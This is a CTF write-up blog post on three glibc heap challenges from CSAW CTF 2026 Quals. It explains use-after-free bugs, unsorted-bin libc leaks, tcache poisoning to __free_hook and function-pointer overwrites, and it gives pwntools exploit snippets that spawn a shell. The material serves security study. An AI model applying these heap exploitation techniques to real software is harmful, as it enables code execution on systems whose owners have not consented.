---
title: "CSAW CTF 2026 Quals — Three glibc Heap Challenges"
date: 2026-10-14
tags: ["pwn", "heap", "uaf", "glibc", "tcache"]
categories: ["CSAW CTF 2026 Quals"]
summary: "Diamond Dogs, Hell's Bells, Saint Vespers. Three challenges that leak libc through a UAF and reclaim a freed object to overwrite a function pointer."
translationKey: "csaw-2026-heap"
---

## Overview

Three pwn challenges from CSAW CTF 2026 Quals, bundled because they are structurally the same problem.

| | glibc | bug | target |
|---|---|---|---|
| Diamond Dogs | 2.31 | freed pointers never cleared — objects and buffers both | function pointer inside the object |
| Hell's Bells | 2.31 | edit path reachable through a freed chunk | tcache fd → `__free_hook` |
| Saint Vespers | 2.35 | fields written after the object is freed | `sing` on a reclaimed object |

The mitigations move in the same direction.

| | RELRO | PIE | Canary | other |
|---|---|---|---|---|
| Diamond Dogs | Partial | No PIE | none | |
| Hell's Bells | Full | PIE | none | |
| Saint Vespers | Full | PIE | yes | SHSTK · IBT |

All three share one skeleton.

1. Free a chunk too large for tcache so it lands in the unsorted bin
2. Read through the stale pointer to recover a `main_arena` address
3. Free an object holding a function pointer, reclaim it through a different path that shares the same bin, and overwrite that pointer
4. Call the object's method

The leak and the control-flow hijack are **two uses of the same bug**. What changes per challenge is only which path fails to clear a pointer on free, and which path can write far enough to reach the interesting offset.

The libc version is where they diverge. Diamond Dogs and Hell's Bells run on 2.31, so neither safe-linking (2.32) nor hook removal (2.34) applies. Hell's Bells spends exactly that: it overwrites a tcache fd directly and lands on `__free_hook`. Saint Vespers runs on 2.35, where both of those are gone, so it goes after a function pointer inside an application object instead — and since that never touches the freelist, safe-linking becomes irrelevant.

## Shared technique: leaking libc through the unsorted bin

A chunk that goes into tcache carries a tcache-struct address in its fd, which doesn't hand you a libc base. A chunk past tcache's capacity (chunk size above `0x410`) goes to the unsorted bin instead, and its fd/bk point near `main_arena`.

On glibc 2.31 the unsorted bin sits at `main_arena + 96`. `main_arena` immediately follows `__malloc_hook`, so the offset is reachable even without arena symbols.

```python
main_arena = libc.sym['__malloc_hook'] + 0x10
libc.address = leak - (main_arena + 96)
assert libc.address & 0xfff == 0
```

That `assert` is not optional. A libc base is page-aligned, so a nonzero low 12 bits means either the offset arithmetic or the leak site is wrong. The one line catches "it printed something, and all of it is garbage" immediately.

From 2.34 on there is no `__malloc_hook` symbol, so this expression doesn't work. Measure the unsorted-bin offset in that libc and hardcode it.

### The guard chunk

A chunk adjacent to the top chunk is absorbed into top on free rather than entering the unsorted bin, and then there is no pointer to leak at all.

So allocate the large chunk first, **allocate a small one behind it to separate it from top**, and only then free the large one.

```python
file_note(p, 0, 0x500, b'A')
file_note(p, 1, 0x20, b'B')
shred(p, 0)
```

The `0x20` in slot 1 is never used again. It exists to block consolidation into top.

## Diamond Dogs

### Layout

```
guard-dog   amd64, No PIE, Partial RELRO, no canary, NX, not stripped
libc-2.31.so / ld-2.31.so
```

Symbols survive, so the globals are visible directly.

```
dogs      0x404120
notes     0x4040e0
note_sz   0x4040a0
woof      0x401256
```

There are two managed things. `dogs` is an array of object pointers, `notes` an array of byte-buffer pointers, eight slots each (`0-7`). Every menu handler is inlined into `main`, so there are no separate functions to read.

A dog object comes from `malloc(0x20)` with a function pointer at the end (`+0x18`).

```c
pvVar3 = malloc(0x20);
*(code **)((long)pvVar3 + 0x18) = woof;
read_n(pvVar3, 0x18);
*(undefined1 *)((long)pvVar3 + 0x17) = 0;
*(void **)(dogs + uVar4 * 8) = pvVar3;
```

And the call looks like this.

```c
lVar1 = *(long *)(dogs + uVar4 * 8);
(**(code **)(lVar1 + 0x18))(lVar1);
```

### The bug

There are two free paths, and **neither clears its pointer.**

```c
free(*(void **)(dogs + uVar4 * 8));
free(*(void **)(notes + uVar4 * 8));
```

The note-side dangling pointer drives the leak; the dog-side one drives the hijack.

### Asymmetric write lengths

What this challenge actually turns on is that the two allocation paths write different amounts.

`adopt` allocates `0x20` but reads only `0x18` bytes through `read_n`, then zeroes `+0x17`. The function pointer at `+0x18` is **deliberately out of reach.**

`file_note` is different. It reads the full requested size.

```c
if (*(long *)(notes + uVar4 * 8) == 0) {
    __size = read_long();
    if (__size - 1 < 0x1000) {
        pvVar3 = malloc(__size);
        read_n(pvVar3, __size);
        ...
    }
}
```

There is an occupancy check. But `shred` leaves the pointer in place, so a freed slot stays occupied and each new note needs an unused slot number.

`malloc(0x20)` and `malloc(0x20)` both give chunk size `0x30`, so they share a tcache bin. Which means **freeing a dog and then allocating a note of the same size hands that dog chunk back as a note, and this time `+0x18` is writable.**

The bug is that the guard is attached to only one of the two paths.

### The leak

The note read path is a `write` syscall, not `puts`.

```c
write(1, *(void **)(notes + uVar4 * 8), *(size_t *)(note_sz + uVar4 * 8));
```

It doesn't stop at a NULL; it emits exactly the stored length. A freed chunk's fd comes back verbatim.

The size limit is `__size - 1 < 0x1000`, so `0x500` is allowed. That makes a `0x510` chunk, which exceeds the `0x410` tcache ceiling and therefore goes to the unsorted bin.

```python
file_note(p, 0, 0x500, b'A')
file_note(p, 1, 0x20, b'B')
shred(p, 0)

leak = u64(read_note(p, 0, 0x500)[:8])
main_arena = libc.sym['__malloc_hook'] + 0x10
libc.address = leak - (main_arena + 96)
assert libc.address & 0xfff == 0, 'leak offset wrong'
```

### Hijacking control flow

Create a dog with `/bin/sh` in the name field. The calling convention passes the object pointer as the first argument, so the object's own address is the argument.

```python
adopt(p, 0, b'/bin/sh\x00')
release(p, 0)
file_note(p, 2, 0x20,
          b'/bin/sh\x00' + b'\x00' * 0x10 + p64(libc.sym.system))
command(p, 0)
```

`file_note` reclaims the chunk that `release` pushed into tcache and overwrites the function pointer at `+0x18` with `system`. `command` invokes it as `(*fp)(obj)`, which is `system("/bin/sh")`.

No one_gadget, no ROP. The calling convention fills in the argument.

### Full flow

```
file_note(0, 0x500)   allocate the large chunk
file_note(1, 0x20)    guard chunk
shred(0)              into the unsorted bin
read_note(0)          leak main_arena
adopt(0, "/bin/sh")   create the object
release(0)            into the 0x30 tcache bin
file_note(2, 0x20)    reclaim the same chunk, overwrite +0x18
command(0)            system("/bin/sh")
```

### Notes

- The leak and the hijack use different bins. `0x510` is the unsorted bin, `0x30` is tcache.
- Drop the guard chunk and the `0x510` chunk is absorbed into top, so the leak step produces nothing.
- `adopt` zeroing `+0x17` is code protecting the function pointer. That the protection is attached to only one allocation path is the whole challenge.

## Hell's Bells

### Layout

```
thermite-charge   amd64, PIE, Full RELRO, no canary, NX, not stripped
libc-2.31.so / ld-2.31.so
```

The menu structure is nearly identical to Diamond Dogs. Sixteen slots, two globals.

```
charges   0x40e0
sizes     0x4060
```

The difference is that there are no objects. Everything here is a plain byte buffer, so there is no function pointer to overwrite. `read_long`, `read_n`, the `__size - 1 < 0x1000` limit, and the `write`-based `inspect` are all the same as before.

PIE and Full RELRO are on but don't matter. The exploit below uses neither a binary address nor the GOT.

### The bug

`plant` checks whether a slot is empty (`== 0`). But `defuse` doesn't clear the pointer, so a freed slot stays "occupied."

```c
free(*(void **)(charges + uVar2 * 8));
puts("charge defused");
```

And `rewire` writes to that slot again.

```c
if ((uVar2 < 0x10) && (*(long *)(charges + uVar2 * 8) != 0)) {
    read_n(*(undefined8 *)(charges + uVar2 * 8),
           *(undefined8 *)(sizes + uVar2 * 8));
}
```

It never checks whether the chunk is freed, and the length is the original allocation size. That means **the head of a freed chunk can be set to anything**, and that position is tcache's `next` pointer.

Where Diamond Dogs needed "reclaim through another path sharing the bin," here the freelist is edited in place with no reclaim at all.

### tcache poisoning

glibc 2.31 has no safe-linking, so whatever goes into fd is used as the next chunk address verbatim. And `__free_hook` still exists.

The leak is the shared technique unchanged.

```python
plant(p, 0, 0x500, b'A')
plant(p, 1, 0x20, b'B')
defuse(p, 0)

leak = u64(inspect(p, 0, 0x500)[:8])
main_arena = libc.sym['__malloc_hook'] + 0x10
libc.address = leak - (main_arena + 96)
assert libc.address & 0xfff == 0, 'libc offset wrong'
```

The rest is the actual exploit.

```python
plant(p, 2, 0x20, b'C')
plant(p, 3, 0x20, b'D')
defuse(p, 2)
defuse(p, 3)

rewire(p, 3, 0x20, p64(libc.sym['__free_hook']))

plant(p, 4, 0x20, b'/bin/sh\x00')
plant(p, 5, 0x20, p64(libc.sym.system))

menu(p, 2)
p.sendlineafter(b'slot: ', b'4')
```

How the `0x30` tcache bin evolves.

```
defuse(2)             head -> c2
defuse(3)             head -> c3 -> c2
rewire(3, &free_hook) head -> c3 -> __free_hook
plant(4)              returns c3,  head -> __free_hook
plant(5)              returns __free_hook
```

Slot 4 holds c3 containing `/bin/sh`; slot 5 is `__free_hook` itself containing `system`. Then `defuse` on slot 4 calls `free(c3)`, and `__free_hook` is invoked with c3 as its argument, which is `system("/bin/sh")`.

### Why two chunks have to be freed

Overwriting fd works with a single freed chunk. The second allocation just doesn't follow the poisoned address.

tcache tracks `counts[idx]` separately, and `tcache_get` is only called while `counts > 0`. With one chunk freed, counts is 1; the first allocation drops it to 0 and the second allocation never goes through tcache. However well fd is overwritten, nothing follows the link.

With two freed, counts is 2. The first allocation takes c3 and leaves 1, and the second still sees `> 0`, so it returns the `entries[idx]` that was overwritten. Two `0x20` chunks is the minimum.

### Notes

- The only difference between these two challenges is where a writable dangling pointer comes from. Diamond Dogs reclaims a freed object through another path; Hell's Bells gets one directly because the edit path never checks the freed state. The latter is the stronger primitive, which is why the freelist can be manipulated directly.
- `plant` checks occupancy with `!= 0` while `defuse` leaves the pointer, so a slot cannot be cycled through free-and-reuse. Each operation takes a fresh slot number.
- `__free_hook` is only available because this is glibc 2.31. From 2.34 on that landing site is gone — which is the next challenge.

## Saint Vespers and the Copper Choir

### Layout

This is the only one of the three shipped with its original C source. No decompilation needed, but more to read.

```
vespers     amd64, PIE, Full RELRO, canary, NX, SHSTK, IBT
vespers.c
ld-2.35.so / libc.so_3.6   (Ubuntu GLIBC 2.35-0ubuntu3.14)
```

The heaviest mitigations of the three, and none of them matter, because the final target is **the entry point of a legitimate function**. Swapping the `sing` field for `system` and letting `choir[i]->sing(choir[i])` run means the indirect branch lands on a valid function start, and nothing touches the stack, so the canary and the shadow stack are never involved. What CET blocks is jumping into the middle of a function, ROP-style.

One struct is managed.

```c
typedef struct chorister {
    char   name[NAME_SIZE];        /* 0x38 */
    void (*sing)(struct chorister *self);
    char  *transcript;
    size_t transcript_len;
    int    active;
} chorister_t;
```

`sizeof(chorister_t)` is `0x58`, giving chunk size `0x60`. The function pointer can only be chosen from a whitelist.

```c
static void (*const sing_table[3])(chorister_t *) = {
    sing_gregorian, sing_echo, sing_harmony,
};
...
if (style < 0 || style > 2) style = 0;
c->sing = sing_table[style];
```

Index validation is clean as well.

```c
static int valid_idx(long idx) {
    return idx >= 0 && idx < MAX_CHOIR && choir[idx] != NULL;
}
```

Passing static buffers to `setvbuf` in `main` is deliberate too. stdio never touches the heap, so the chunk layout is exactly what the operations produce — the source comments say as much.

### The bug

`op_retire` writes to a field after freeing.

```c
if (c->transcript) free(c->transcript);
free(c);
c->active = 0;
```

Three lines, three problems.

- `choir[idx]` is never set to NULL, so the freed object stays a valid slot.
- `c->transcript` is never set to NULL, so a pointer to the freed transcript survives.
- `c->active = 0` after `free(c)` is a write to freed memory.

That last write is at `+0x50`, which misses the `next` (`+0x00`) and `key` (`+0x08`) fields tcache uses. The freelist stays intact and the freed object quietly stays usable.

`op_restore` undoes the write.

```c
if (c->active) { puts("..."); return; }
c->active = 1;
```

`retire` sets the flag to 0 and `restore` puts it back to 1, so the freed object passes every path that requires `active` again: `inscribe`, `recite`, `rename`, `perform`.

In source, `c->active = 0` one line below `free(c)` is immediately visible. In a decompiler it would be one offset assignment into a global array.

### The leak

A transcript length of `0x500` gives a `0x510` chunk, past the tcache ceiling. The second `recruit` is the guard — the same move as the `0x20` guard chunks in the other two, except here an object and a transcript stack up behind it, so consolidation into top is blocked more firmly.

```python
recruit(p, b'AAAA', 0, 0x500, b'A')
recruit(p, b'BBBB', 0, 0x20,  b'B')

retire(p, 0)
restore(p, 0)

leak = u64(recite(p, 0, 0x500)[:8])

UNSORTED_OFF = 0x21ace0
libc.address = leak - UNSORTED_OFF
assert libc.address & 0xfff == 0, 'libc offset wrong'
```

`retire(0)` frees both the transcript and the object; `restore(0)` revives `active`. `op_recite` uses `c->transcript` and `c->transcript_len` as they stand, so the contents of the freed `0x510` chunk come out through `write`.

```c
(void)write(1, c->transcript, c->transcript_len);
```

With no `__malloc_hook`, the offset was measured in this libc and hardcoded.

### Same size class

This is the core of the challenge. The transcript length is **mine to choose**, anywhere from `1` to `0x1000`. And `sizeof(chorister_t)` is `0x58`.

So a transcript of length `0x58` is allocated from the same `0x60` bin as an object. The allocation order inside `op_recruit` gives the result.

```c
chorister_t *c = malloc(sizeof(chorister_t));   /* 0x60 bin */
...
char *transcript = malloc((size_t)len);          /* len=0x58, same 0x60 bin */
...
read_exact(transcript, (size_t)len);
```

One `recruit` allocates twice from the `0x60` bin. The first becomes a new object; the second becomes **a buffer whose entire contents I supply.** Put two freed objects in the bin and the second allocation picks up another object that is still attached to a slot.

```python
retire(p, 1)

payload  = b'/bin/sh\x00'.ljust(0x38, b'\x00')
payload += p64(libc.sym.system)
payload += p64(0)
payload += p64(0)
payload += p32(1)
payload  = payload.ljust(0x58, b'\x00')

recruit(p, b'CCCC', 0, 0x58, payload)
menu(p, 8)
```

The `0x60` bin and what each allocation returns.

```
retire(1)          free(t1) -> 0x30 bin,  free(obj1) -> head -> obj1 -> obj0
recruit, malloc 1  malloc(0x58) -> obj1  = the new object in slot 2
recruit, malloc 2  malloc(0x58) -> obj0  = the transcript buffer
read_exact         payload overwrites all of obj0
```

`obj0` is still `choir[0]`, and still `active` thanks to `restore(0)`. The payload reconstructs that struct field by field.

```
name            "/bin/sh\0"
sing            system
transcript      0
transcript_len  0
active          1
```

`op_perform` passes the object to itself per the calling convention.

```c
if (choir[i] && choir[i]->active)
    choir[i]->sing(choir[i]);
```

The struct's start address is the address of `name`, so this is `system("/bin/sh")`.

### Notes

- The whitelisted function pointer is enforced **only at creation time.** The `sing_table` range check lives inside `op_recruit`, and no path that reaches the `sing` field afterward goes through it.
- `NAME_SIZE 0x38` and the transcript range `1..0x1000` overlap at `0x58`. A caller-sized buffer and a fixed-size struct share a size class.
- Safe-linking is never touched. Instead of overwriting an fd, the exploit uses the normal allocation order to receive the chunk it wants.
- `op_roster` prints all `0x38` bytes of `name` regardless of `active`. Pointed at a freed object it yields a mangled tcache `next`, but this solve didn't need it.

## Looking at it again

Re-reading these while writing the post turned up paths that went unused at the time. The following were not considered during the solve, and they are a re-read of the code rather than anything actually run.

### Diamond Dogs — tcache poisoning was available

A dog chunk reclaimed through `file_note` is writable from offset 0, and that position is tcache's `next`. The solve wrote `/bin/sh` there; writing an address instead gives the same poisoning Hell's Bells used. Being 2.31, there is no safe-linking either.

No PIE compounds it. The globals sit at fixed addresses.

```
notes     0x4040e0
note_sz   0x4040a0
```

Landing a chunk on `note_sz` and writing an arbitrary length extends `read_note`'s output by that much. Covering `notes` as well puts both the address and the length under control, which is an arbitrary read. Writing into a poisoned chunk with `file_note` is an arbitrary write.

The occupancy check does constrain it: each note needs a fresh slot number and there are only eight. Covering both globals means counting allocations up front.

### Hell's Bells — the large chunk was only read

`rewire` doesn't check the freed state, so the `0x500` chunk is writable too. The solve only ever `inspect`ed it.

That means the `fd`/`bk` of a chunk sitting in the unsorted bin can be written, which is the precondition for an unsorted-bin or largebin attack. The tcache route was simpler, so that was the only one used.

`rewire` also covers `key` (`+0x08`) along with `next` (`+0x00`). Clearing `key` gets past 2.31's tcache double-free check. There was no need for it, but it was there.

### Saint Vespers — arbitrary read/write was skipped

The biggest miss. The final payload reconstructs the whole struct, and that includes `transcript` and `transcript_len`.

```python
payload += p64(0)   # transcript
payload += p64(0)   # transcript_len
```

Both were zero-filled. But those are exactly the two fields `op_recite` and `op_inscribe` use.

```c
(void)write(1, c->transcript, c->transcript_len);   /* recite */
read_exact(c->transcript, c->transcript_len);        /* inscribe */
```

An `(address, length)` pair there would have turned that slot into a reusable arbitrary-read and arbitrary-write handle — not once, but for as long as the slot lives. Strictly stronger than overwriting `sing` alone, for the same single write.

`solve.py` defines `rename()` and `roster()` helpers and never calls either. Those were the remaining paths.

- `op_roster` prints all `0x38` bytes of `name` regardless of `active`. Pointed at a freed object it yields a mangled tcache `next`, and since 2.35 mangles with `(chunk address >> 12) ^ pointer`, the heap base falls out of it.
- `op_rename` writes `0x37` bytes at offset 0 of `name`. Pointed at a freed object it covers both `next` and `key`.

Together they make tcache poisoning work on 2.35: get the heap base from `roster`, compute the mangling, and overwrite `next` with `rename`. What safe-linking blocks is poisoning without knowing the address; it doesn't block anything when a leak path is open alongside it.

## Summary

How each challenge obtains its UAF, and where it lands.

| | how the dangling pointer is obtained | landing site |
|---|---|---|
| Diamond Dogs | reclaim a freed object through a different allocation path | the object's function pointer |
| Hell's Bells | the edit path never checks the freed state | tcache fd → `__free_hook` |
| Saint Vespers | a post-free field assignment keeps the slot alive | function pointer on an object received from the same size class |

The leak is identical in all three. Free something past the `0x410` tcache ceiling into the unsorted bin, then read through the pointer that was never cleared.

What differs is the libc version.

| | 2.31 | 2.35 |
|---|---|---|
| tcache fd mangling | none | `(chunk address >> 12) ^ pointer` |
| `__malloc_hook` / `__free_hook` | present | removed |
| unsorted-bin offset | `__malloc_hook + 0x10 + 96` | no symbol, measure it |
| shortest route | poison the freelist → hook | function pointer on an application object |

On 2.31 the hooks exist, so one freelist manipulation finishes the job. On 2.35 that landing site is gone, and the target moves from libc to the program's own objects. That route never touches the freelist, so safe-linking never comes into play.

---

Full scripts: [ctf-writeups/2026-csaw-quals](https://github.com/wjddml/ctf-writeups/tree/main/2026-csaw-quals)
